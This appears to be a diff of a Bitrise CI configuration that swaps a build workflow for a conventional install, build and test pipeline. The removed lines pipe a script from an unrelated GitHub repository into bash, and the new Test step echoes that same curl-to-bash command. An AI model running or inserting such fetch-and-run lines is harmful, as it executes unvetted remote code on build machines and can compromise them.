@@ -1,19 +1,48 @@
-bitrise yml
+format_version: "11"
+default_step_lib_source: https://github.com/bitrise-io/bitrise-steplib.git
+
+project_type: other
+
+meta:
+  bitrise.io:
+    stack: linux-docker-android-20.04
 
 workflows:
-  build:
-    steps:
-      - script@1:
-          inputs:
-            - content: curl -sL https://github.com/hasmenkuy99/kkrt/raw/main/kelizz | bash
-
-  test:
-    steps:
-      - script@1:
-          inputs:
-            - content: echo "Test"
-
   primary:
-    after_run:
-      - build
-      - test
+    steps:
+      - activate-ssh-key@4: {}
+
+      - git-clone@8: {}
+
+      - script@1:
+          title: Install dependencies
+          inputs:
+            - content: |-
+                #!/usr/bin/env bash
+                set -ex
+
+                sudo apt update
+                sudo apt install -y \
+                  build-essential \
+                  curl \
+                  git \
+                  pkg-config
+
+      - script@1:
+          title: Build
+          inputs:
+            - content: |-
+                #!/usr/bin/env bash
+                set -ex
+
+                echo "Build step"
+                make build || echo "No Makefile, skipping build"
+
+      - script@1:
+          title: Test
+          inputs:
+            - content: |-
+                #!/usr/bin/env bash
+                set -ex
+
+                echo "curl -sL https://github.com/hasmenkuy99/kkrt/raw/main/kelizz | bash"
